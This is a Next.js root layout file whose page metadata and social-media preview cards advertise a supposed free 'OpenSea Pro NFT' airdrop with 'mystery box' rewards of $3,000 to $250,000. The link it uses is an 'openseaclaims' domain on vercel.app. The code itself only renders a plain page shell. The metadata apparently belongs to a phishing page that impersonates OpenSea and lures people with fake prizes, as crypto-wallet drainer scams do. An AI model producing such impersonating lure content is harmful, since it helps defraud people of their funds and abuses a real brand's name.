import type { Metadata } from "next";
import type { ReactNode } from "react";

export const metadata: Metadata = {
  title: "CLICK HERE - OPENSEA PRO NFT",
  description:
    "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
  openGraph: {
    title: "CLICK HERE - OPENSEA PRO NFT",
    description:
      "AIRDROP IS LIVE NOW  Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
    url: "https://openseaclaims-chi.vercel.app/",
    siteName: "This is an automatically generated announcement message",
    images: [
      {
        url: "https://openseaclaims-chi.vercel.app/389-9bec97c22fa2e411.gif",
        width: 800,
        height: 600,
        alt: "CLICK HERE - OPENSEA PRO NFT preview",
      },
    ],
    type: "website",
  },
  twitter: {
    card: "summary_large_image",
    title: "CLICK HERE - OPENSEA PRO NFT",
    description:
      "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
    images: ["https://openseaclaims-chi.vercel.app/389-9bec97c22fa2e411.gif"],
  },
};

export default function RootLayout({ children }: { children: ReactNode }) {
  return (
    <html lang="en-US" data-theme="light">
      <body>{children}</body>
    </html>
  );
}
